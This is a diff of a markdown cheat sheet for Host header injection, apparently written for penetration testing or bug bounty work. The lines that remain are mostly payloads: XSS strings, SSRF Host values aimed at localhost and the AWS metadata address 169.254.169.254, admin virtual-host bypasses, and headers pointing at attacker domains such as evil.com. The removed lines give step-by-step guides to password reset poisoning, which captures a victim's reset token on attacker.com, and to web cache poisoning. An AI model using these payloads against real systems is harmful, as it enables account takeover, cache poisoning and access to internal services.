@@ -478,10 +478,9 @@ Hello" onkeypress="prompt(1)
 
 ```http
 Host: bing.com
-Host: evil.com
-Host: attacker.com
 Host: fake.target.com
 X-Forwarded-Host: realweb.com
+
 Host: realweb.com
 X-Forwarded-Host: bing.com
 Referer: https://www.bing.com/
@@ -489,9 +488,6 @@ Try to change host and referer header because few host is verify for referer hea
 also do the same first three attack to insert the referer header (Change referer header)
 
 Host: bing.com"><script>alert(1)</script>
-
-GET / HTTP/1.1
-Host: attacker.com
 
 GET / HTTP/1.1
 Host: vulnerable.com
@@ -541,45 +537,29 @@ Host: evil.com:8080
 ```
 Host: legit.com.evil.com
 ```
-
 ---
-
 # 📌 **2.4 SSRF Using Host Header**
 
 ```
 Host: 127.0.0.1
 ```
-
 ```
 Host: 169.254.169.254   # AWS metadata
 ```
-
 ```
 Host: localhost
 ```
-
 ---
-
 # 📌 **2.5 Admin Panel / VHost Bypass**
-
 ```
 Host: admin.target.com
 ```
-
 ```
 Host: internal.target.local
 ```
-
 ```
 Host: staging.target.com
 ```
-
----
-
-# **3. Bypass Testcases (Advanced)**
-
-Below are full bypass patterns to defeat filters, WAF, and strict host validation logic.
-
 ---
 
 # 🔥 **3.1 Domain Validation Bypass Payloads**
@@ -786,127 +766,6 @@ X-Forwarded-Server: admin.local
 Origin: http://evil.com
 Forwarded: host=internal.target
 ```
-### 🧪 Techniques Covered in the Labs
-
-- **Password Reset Poisoning via Host Header**
-  - Modify the `Host` header to point to an attacker-controlled domain.
-  - Capture the password reset token sent to the malicious domain.
-
-- **Password Reset Poisoning via X-Forwarded-Host**
-  - Use `X-Forwarded-Host` instead of `Host` to poison the reset link.
-  - Useful when the application trusts proxy headers.
-
-- **Dangling Markup Injection**
-  - Inject HTML tags into the `Host` header to manipulate email content.
-  - Example: `<a href="http://evil.com">Click here</a>` embedded in the reset email.
-
-- **Web Cache Poisoning**
-  - Send ambiguous requests with multiple `Host` headers.
-  - Poison the cache to serve malicious content to other users.
-
-- **Host Header Authentication Bypass**
-  - Replace the `Host` header with `localhost` or internal IP to gain admin access.
-  - Exploits trust assumptions in routing logic.
-
-- **Routing-Based SSRF via Host Header**
-  - Use internal IPs in the `Host` header to access internal services.
-  - Example: `Host: 192.168.0.96` to reach `/admin` panel.
-
-- **SSRF via Flawed Request Parsing**
-  - Exploit parsing inconsistencies by combining external and internal hosts.
-  - Often requires Burp Collaborator to confirm SSRF behavior.
-
-These techniques are all demonstrated in the labs and write-ups within that GitHub repo. If you want, I can help you craft payloads or automate testing for each one.
----
-
-## 💥 1. **Web Cache Poisoning via Host Header**
-
-1. **Send a normal GET request and observe the Host: header** 
-   ```http
-   GET / HTTP/1.1  
-   Host: vulnerable-website.com
-   ```
-2. **Check if caching is enabled**  Look for headers like:
-   ```
-   X-Cache: HIT or MISS  
-   Cache-Control: public  
-   ```
-3. **Inject a fake Host and observe response**
-   ```http
-   GET / HTTP/1.1  
-   Host: attacker.com
-   ```
-4. **Send multiple requests to check if content is cached**
-   Send the same request and see if the response (with attacker.com) persists.
-5. **If vulnerable, host malicious content on attacker.com**
-   Others accessing the same page may receive poisoned content.
----
-## 🔐 2. **Password Reset Poisoning via Host Header**
-
-Receive the password reset link of a victim on a malicious domain.
-
-### ✅ Steps:
-
-1. **Start the "Forgot Password" flow**
-   Enter victim's email (or your own test account).
-
-2. **Intercept the request in Burp Suite**
-   Locate the `Host:` header:
-
-   ```
-   Host: vulnerable-website.com
-   ```
-
-3. **Modify it to your malicious domain**
-
-   ```
-   Host: attacker.com
-   ```
-
-4. **Forward the request**
-   If the app uses `Host:` to build the reset URL, the email will contain a link to `attacker.com/...`
-
-5. **Capture the request on attacker.com**
-   Host a simple server (e.g., `python3 -m http.server`) and log incoming URLs.
-
----
-
-## 🌐 3. **SSRF via Host Header**
-
-### 🎯 Objective:
-
-Use Host header to trick the server into making internal HTTP requests (SSRF).
-
-### ✅ Steps:
-
-1. **Find a feature that fetches data from a URL or reflects Host**
-   e.g., redirects, URL previews, tracking pixels.
-
-2. **Send a crafted Host header pointing to an internal resource**
-
-   ```http
-   GET / HTTP/1.1  
-   Host: 127.0.0.1
-   ```
-
-3. **Observe response for internal content**
-   You might see server error, timeout, or internal app data in the response.
-
-4. **Try internal services like:**
-
-   * `localhost`
-   * `169.254.169.254` (AWS metadata)
-   * `internal-api.local`
-
-5. **Log sensitive data**
-   If SSRF is successful, log internal endpoints/data accessed via your Host payload.
-
----
-
-### 🛠️ **Proxy-Aware Tools for Testing**
-
-To simulate or bypass corporate proxies, use these tools:
-
 | Tool | Description |
 |------|-------------|
 | [Burp Suite](https://portswigger.net/burp) | Use Repeater and Intruder to test header combinations. |
@@ -915,7 +774,6 @@ To simulate or bypass corporate proxies, use these tools:
 | [Param Miner (Burp Extension)](https://portswigger.net/bappstore/9f3c3b7b9e4f4e3e9c3d3e3b9f3c3b7b) | Finds hidden headers and ambiguous parsing behavior. |
 
 ---
-
 ### 🧪 **Advanced Proxy Bypass Tricks**
 
 - **Use internal IPs**: `Host: 127.0.0.1` or `Host: 192.168.0.1`
